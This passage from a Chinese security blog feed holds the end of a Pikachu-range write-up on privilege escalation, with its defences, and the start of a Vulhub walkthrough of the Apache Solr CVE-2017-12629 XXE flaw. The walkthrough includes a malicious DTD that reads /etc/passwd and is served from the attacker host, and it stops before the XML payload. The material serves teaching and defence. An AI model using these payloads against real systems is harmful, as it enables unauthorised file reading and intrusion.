&lt;td&gt;数据泄露&lt;/td&gt;
&lt;td&gt;非授权操作、管理功能滥用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;修复重点&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;接口绑定用户身份校验&lt;/td&gt;
&lt;td&gt;严格校验接口访问者的角色&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;1-成因&#34;&gt;&lt;a href=&#34;#1-成因&#34; class=&#34;headerlink&#34; title=&#34;1. 成因&#34;&gt;&lt;/a&gt;1. 成因&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;水平越权&lt;/strong&gt;：后端信任用户输入（如 &lt;code&gt;username&lt;/code&gt;），未校验与会话用户的一致性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;垂直越权&lt;/strong&gt;：管理接口未验证用户角色，允许任意用户通过伪造请求访问。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-利用方式&#34;&gt;&lt;a href=&#34;#2-利用方式&#34; class=&#34;headerlink&#34; title=&#34;2. 利用方式&#34;&gt;&lt;/a&gt;2. 利用方式&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;水平越权&lt;/strong&gt;：通过修改 URL 参数（如 &lt;code&gt;username&lt;/code&gt;），访问其他用户数据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;垂直越权&lt;/strong&gt;：使用 Burp Suite 重放管理员请求，替换为普通用户的会话。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-危害&#34;&gt;&lt;a href=&#34;#3-危害&#34; class=&#34;headerlink&#34; title=&#34;3. 危害&#34;&gt;&lt;/a&gt;3. 危害&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;水平越权&lt;/strong&gt;：导致用户隐私泄露，可能引发后续社会工程学攻击。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;垂直越权&lt;/strong&gt;：可能导致系统完全失控，如创建恶意管理员账户。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;七、防护建议&#34;&gt;&lt;a href=&#34;#七、防护建议&#34; class=&#34;headerlink&#34; title=&#34;七、防护建议&#34;&gt;&lt;/a&gt;七、防护建议&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;严格权限校验&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;水平越权&lt;/strong&gt;：确保请求参数与当前会话用户一致（如 &lt;code&gt;$_SESSION[&amp;#39;user&amp;#39;] == $_GET[&amp;#39;username&amp;#39;]&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;垂直越权&lt;/strong&gt;：验证用户角色，确保管理接口仅管理员可访问（如 &lt;code&gt;$_SESSION[&amp;#39;role&amp;#39;] == &amp;#39;admin&amp;#39;&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;最小权限原则&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置 Web 应用以最低权限运行，限制普通用户的功能访问。&lt;/li&gt;
&lt;li&gt;确保敏感接口（如用户管理）仅对特定角色开放。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;安全编码&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对所有用户输入进行严格校验，防止参数篡改。&lt;/li&gt;
&lt;li&gt;使用安全的会话管理机制（如 CSRF 令牌）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;部署 WAF&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置 Web 应用防火墙，拦截异常请求（如非法的 &lt;code&gt;username&lt;/code&gt; 参数或未授权的管理请求）。&lt;/li&gt;
&lt;li&gt;使用正则规则检测可疑参数。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;日志监控&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;记录所有接口访问日志，监控异常的权限请求。&lt;/li&gt;
&lt;li&gt;定期审计日志，及时发现潜在越权行为。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;前端与后端协同&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前端隐藏敏感功能（如管理员菜单），但不能仅依赖前端控制。&lt;/li&gt;
&lt;li&gt;后端必须独立验证所有请求的权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;八、总结&#34;&gt;&lt;a href=&#34;#八、总结&#34; class=&#34;headerlink&#34; title=&#34;八、总结&#34;&gt;&lt;/a&gt;八、总结&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;信息&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;权限绕过（水平越权、垂直越权）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;靶场&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Pikachu（&lt;code&gt;http://192.168.147.137:81/pikachu/&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;漏洞模块&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;/vul/overpermission/op1/&lt;/code&gt;（水平越权）&lt;br&gt; &amp;#x2F;vul&amp;#x2F;overpermission&amp;#x2F;op2&amp;#x2F;（垂直越权）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;危害&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;数据泄露、未经授权的操作、系统失控&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;修复核心&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;用户身份校验、角色权限验证&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Pikachu 靶场的 &lt;strong&gt;Over Permission 模块&lt;/strong&gt; 通过模拟水平越权和垂直越权场景，展示了权限校验缺失的严重后果。水平越权允许普通用户访问其他用户数据，垂直越权则让普通用户执行管理员操作。通过本文的复现，读者可以深入理解越权漏洞的成因、利用方式及修复方法。开发者应在开发中始终遵循“后端校验优先”原则，结合 WAF 和日志监控，构建安全的 Web 应用。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="Web安全" />
        <category term="权限绕过" />
        <category term="水平越权" />
        <category term="垂e直越权" />
        <category term="Pikachu靶场" />
        <updated>2025-08-02T10:00:32.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/</id>
        <title>Apache Solr CVE-2017-12629 XXE 漏洞复现与利用（基于 Vulhub）</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）&#34;&gt;&lt;a href=&#34;#深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）&#34; class=&#34;headerlink&#34; title=&#34;深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）&#34;&gt;&lt;/a&gt;深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;CVE-2017-12629&lt;/strong&gt; 是一个影响 Apache Solr 的 **XML 外部实体注入（XXE）**漏洞，允许攻击者通过构造恶意的 XML 输入，加载外部实体或敏感文件，从而导致信息泄露或进一步攻击。该漏洞难度中等偏上，需要结合远程 DTD（文档类型定义）加载和外带技术进行利用。本文基于 &lt;strong&gt;Vulhub&lt;/strong&gt; 靶场和 &lt;strong&gt;Kali Linux&lt;/strong&gt; 环境，详细复现该漏洞，涵盖环境搭建、原理分析、利用流程及防护建议，旨在帮助安全从业者深入理解 XXE 漏洞的危害与利用方式。&lt;/p&gt;
&lt;p&gt;本文将重点讲解：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞触发原理及利用链&lt;/li&gt;
&lt;li&gt;远程 DTD 构造与外带攻击&lt;/li&gt;
&lt;li&gt;完整的攻击请求构造与验证&lt;/li&gt;
&lt;li&gt;防护措施与注意事项&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二、漏洞概述&#34;&gt;&lt;a href=&#34;#二、漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞概述&#34;&gt;&lt;/a&gt;二、漏洞概述&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;漏洞编号&lt;/strong&gt;：CVE-2017-12629&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;：XXE（XML External Entity Injection）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响版本&lt;/strong&gt;：Apache Solr &amp;lt; 7.1.0&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;测试平台&lt;/strong&gt;：Vulhub + Kali Linux&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;难度&lt;/strong&gt;：中等偏上（需构造远程 DTD 和外带攻击）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;危害&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;读取服务器敏感文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;触发内网资源访问，潜在导致 SSRF&lt;/li&gt;
&lt;li&gt;结合其他漏洞进一步提权或控制服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;三、环境搭建&#34;&gt;&lt;a href=&#34;#三、环境搭建&#34; class=&#34;headerlink&#34; title=&#34;三、环境搭建&#34;&gt;&lt;/a&gt;三、环境搭建&lt;/h2&gt;&lt;h3 id=&#34;1-前提准备&#34;&gt;&lt;a href=&#34;#1-前提准备&#34; class=&#34;headerlink&#34; title=&#34;1. 前提准备&#34;&gt;&lt;/a&gt;1. 前提准备&lt;/h3&gt;&lt;p&gt;确保以下环境已就绪：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络配置&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;NAT 模式（访问外部网络）&lt;/li&gt;
&lt;li&gt;仅主机模式（Host-Only，Kali IP：&lt;code&gt;192.168.56.1&lt;/code&gt;，靶机 IP：&lt;code&gt;192.168.56.102&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;已安装 Docker 和 Docker Compose&lt;/li&gt;
&lt;li&gt;Burp Suite（用于抓包和构造请求）&lt;/li&gt;
&lt;li&gt;Python3（用于托管 DTD 文件）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：Vulhub 的 Apache Solr CVE-2017-12629 环境&lt;ul&gt;
&lt;li&gt;访问地址：&lt;code&gt;http://192.168.56.102:8983/solr/#/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;确保靶场已成功部署（参考 Vulhub 官方文档或前文）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-启动-Vulhub-靶场&#34;&gt;&lt;a href=&#34;#2-启动-Vulhub-靶场&#34; class=&#34;headerlink&#34; title=&#34;2. 启动 Vulhub 靶场&#34;&gt;&lt;/a&gt;2. 启动 Vulhub 靶场&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;克隆 Vulhub 项目（若未下载）：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/vulhub/vulhub.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; vulhub/solr/CVE-2017-12629&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;启动 Docker 容器：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose up -d&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;验证环境：&lt;ul&gt;
&lt;li&gt;访问 &lt;code&gt;http://192.168.56.102:8983/solr/#/&lt;/code&gt;，若看到 Solr 管理界面，说明部署成功 。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;管理容器：&lt;ul&gt;
&lt;li&gt;查看容器：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker ps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;停止容器：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker-compose down&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;四、漏洞原理&#34;&gt;&lt;a href=&#34;#四、漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;四、漏洞原理&#34;&gt;&lt;/a&gt;四、漏洞原理&lt;/h2&gt;&lt;h3 id=&#34;1-XXE-漏洞简介&#34;&gt;&lt;a href=&#34;#1-XXE-漏洞简介&#34; class=&#34;headerlink&#34; title=&#34;1. XXE 漏洞简介&#34;&gt;&lt;/a&gt;1. XXE 漏洞简介&lt;/h3&gt;&lt;p&gt;XXE（XML External Entity Injection）是一种 XML 解析器漏洞，攻击者通过注入恶意 XML 实体，诱导解析器加载外部资源（如本地文件或远程 DTD），从而实现文件读取或网络请求。Apache Solr 的查询接口允许用户提交 XML 格式的参数，且未禁用外部实体解析，导致 XXE 漏洞。&lt;/p&gt;
&lt;h3 id=&#34;2-漏洞触发点&#34;&gt;&lt;a href=&#34;#2-漏洞触发点&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞触发点&#34;&gt;&lt;/a&gt;2. 漏洞触发点&lt;/h3&gt;&lt;p&gt;Solr 的漏洞入口位于以下接口：&lt;/p&gt;
&lt;figure class=&#34;highlight dts&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;/solr/&lt;/span&gt;demo/select?q=&lt;span class=&#34;hljs-params&#34;&gt;&amp;lt;XML_Payload&amp;gt;&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;wt&lt;/span&gt;=xml&lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;defT&lt;span class=&#34;hljs-attr&#34;&gt;ype&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;xmlparser&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;q&lt;/code&gt;：查询参数，接受 XML 格式的输入。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wt=xml&lt;/code&gt;：指定响应格式为 XML。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;defType=xmlparser&lt;/code&gt;：启用 XML 解析器，触发 XXE。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-漏洞限制&#34;&gt;&lt;a href=&#34;#3-漏洞限制&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞限制&#34;&gt;&lt;/a&gt;3. 漏洞限制&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无回显&lt;/strong&gt;：Solr 不直接回显实体内容（如 &lt;code&gt;/etc/passwd&lt;/code&gt;），需通过外带（Out-of-Band, OOB）技术利用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;外带攻击&lt;/strong&gt;：通过构造远程 DTD，诱导 Solr 访问攻击者控制的服务器，从而间接读取目标文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-利用链&#34;&gt;&lt;a href=&#34;#4-利用链&#34; class=&#34;headerlink&#34; title=&#34;4. 利用链&#34;&gt;&lt;/a&gt;4. 利用链&lt;/h3&gt;&lt;figure class=&#34;highlight crmsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs crmsh&#34;&gt;用户提交 &lt;span class=&#34;hljs-keyword&#34;&gt;XML&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Payload&lt;/span&gt; -&amp;gt; Solr &lt;span class=&#34;hljs-keyword&#34;&gt;XML&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;解析器解析 -&amp;gt; 加载远程 DTD&lt;/span&gt; -&amp;gt; 引用本地文件（如 /etc/passwd） -&amp;gt; 外带至攻击者服务器&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;五、漏洞利用流程&#34;&gt;&lt;a href=&#34;#五、漏洞利用流程&#34; class=&#34;headerlink&#34; title=&#34;五、漏洞利用流程&#34;&gt;&lt;/a&gt;五、漏洞利用流程&lt;/h2&gt;&lt;h3 id=&#34;1-初步访问与抓包&#34;&gt;&lt;a href=&#34;#1-初步访问与抓包&#34; class=&#34;headerlink&#34; title=&#34;1. 初步访问与抓包&#34;&gt;&lt;/a&gt;1. 初步访问与抓包&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;配置 Burp Suite：&lt;ul&gt;
&lt;li&gt;打开 Burp Suite，设置代理（默认：&lt;code&gt;127.0.0.1:8080&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;配置 Firefox 浏览器使用 Burp 代理。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;访问 Solr 管理界面：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;56.102&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8983&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/solr/&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#/&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;在 Burp 中拦截请求，观察典型 GET 请求：&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;/solr/&lt;/span&gt; &lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;192.168.56.102:8983&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html,application/xhtml+xml,application/xml;q=0.9&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2-构造远程-DTD-文件&#34;&gt;&lt;a href=&#34;#2-构造远程-DTD-文件&#34; class=&#34;headerlink&#34; title=&#34;2. 构造远程 DTD 文件&#34;&gt;&lt;/a&gt;2. 构造远程 DTD 文件&lt;/h3&gt;&lt;p&gt;由于 Solr 不回显文件内容，需通过外带攻击加载远程 DTD。&lt;/p&gt;
&lt;h4 id=&#34;步骤：&#34;&gt;&lt;a href=&#34;#步骤：&#34; class=&#34;headerlink&#34; title=&#34;步骤：&#34;&gt;&lt;/a&gt;步骤：&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;在 Kali（IP：&lt;code&gt;192.168.56.1&lt;/code&gt;）上创建 DTD 文件 &lt;code&gt;test1.dtd&lt;/code&gt;：&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dtd&#34;&gt;&amp;lt;!ENTITY % passwd SYSTEM &amp;quot;file:///etc/passwd&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;!ENTITY % err &amp;quot;&amp;lt;!ENTITY errmsg SYSTEM &amp;#x27;file:///etc/passwd&amp;#x27;&amp;gt;&amp;quot;&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;strong&gt;说明&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%passwd&lt;/code&gt;：定义实体，尝试读取目标服务器的 &lt;code&gt;/etc/passwd&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%err&lt;/code&gt;：嵌套实体，构造 &lt;code&gt;errmsg&lt;/code&gt; 引用 &lt;code&gt;%passwd&lt;/code&gt;，便于在 XML 中调用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;test1.dtd&lt;/code&gt; 放入 Kali 的 HTTP 目录（如 &lt;code&gt;/var/www/html/&lt;/code&gt;）：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cp&lt;/span&gt; test1.dtd /var/www/html/&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;启动 HTTP 服务：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;python3 -m http.server 80&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
确保 DTD 可通过以下地址访问：&lt;figure class=&#34;highlight dts&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;http:&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.1/test1.dtd&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3-构造-XML-Payload&#34;&gt;&lt;a href=&#34;#3-构造-XML-Payload&#34; class=&#34;headerlink&#34; title=&#34;3. 构造 XML Payload&#34;&gt;&lt;/a&gt;3. 构造 XML Payload&lt;/h3&gt;&lt;p&gt;创建以下 XML Payload，引用远程 DTD：&lt;/p&gt;
